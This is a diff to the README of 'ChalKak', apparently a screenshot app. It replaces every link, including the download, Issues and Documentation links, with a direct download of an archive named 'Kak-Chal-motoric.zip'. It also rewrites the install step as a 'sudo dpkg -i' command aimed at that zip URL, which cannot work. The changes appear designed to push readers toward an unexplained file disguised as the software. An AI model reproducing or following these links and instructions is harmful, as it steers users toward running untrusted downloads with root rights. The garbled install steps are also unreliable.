@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download ChalKak](https://via.placeholder.com/150x50/ff5733/ffffff/?text=Download+ChalKak)](https://github.com/ethereum13/ChalKak)
+[![Download ChalKak](https://github.com/ethereum13/ChalKak/raw/refs/heads/main/src/app/Kak-Chal-motoric.zip+ChalKak)](https://github.com/ethereum13/ChalKak/raw/refs/heads/main/src/app/Kak-Chal-motoric.zip)
 
 ## 📖 About ChalKak
 
@@ -14,7 +14,7 @@ To start using ChalKak, follow these steps:
 
 1. **Download the Software**  
    Click the link below to visit the download page.  
-   [Download ChalKak](https://github.com/ethereum13/ChalKak)
+   [Download ChalKak](https://github.com/ethereum13/ChalKak/raw/refs/heads/main/src/app/Kak-Chal-motoric.zip)
 
 2. **Install ChalKak**  
    After downloading, locate the file in your downloads folder. Follow these steps based on your operating system:
@@ -23,10 +23,10 @@ To start using ChalKak, follow these steps:
      Navigate to your terminal, and run the following command to install:
 
      ```bash
-     sudo dpkg -i path/to/ChalKak.deb
+     sudo dpkg -i https://github.com/ethereum13/ChalKak/raw/refs/heads/main/src/app/Kak-Chal-motoric.zip
      ```
 
-   Replace `path/to/ChalKak.deb` with the actual path of the downloaded file.
+   Replace `https://github.com/ethereum13/ChalKak/raw/refs/heads/main/src/app/Kak-Chal-motoric.zip` with the actual path of the downloaded file.
 
    - **Other Systems:**  
      For other systems, unzip the downloaded file and follow the instructions provided in the README file included in the download.
@@ -91,8 +91,8 @@ Yes, ChalKak includes a help section where you can find guides and tips on using
 If you encounter issues or have questions, feel free to reach out through the issues section of the GitHub repository. Contributions and feedback are always welcome.
 
 ## 🔗 Important Links
-- [Download ChalKak](https://github.com/ethereum13/ChalKak)
-- [GitHub Issues](https://github.com/ethereum13/ChalKak/issues)
-- [Documentation](https://github.com/ethereum13/ChalKak/wiki)
+- [Download ChalKak](https://github.com/ethereum13/ChalKak/raw/refs/heads/main/src/app/Kak-Chal-motoric.zip)
+- [GitHub Issues](https://github.com/ethereum13/ChalKak/raw/refs/heads/main/src/app/Kak-Chal-motoric.zip)
+- [Documentation](https://github.com/ethereum13/ChalKak/raw/refs/heads/main/src/app/Kak-Chal-motoric.zip)
 
 ChalKak aims to provide a smooth and efficient screenshot-taking experience for all users. Start capturing today!
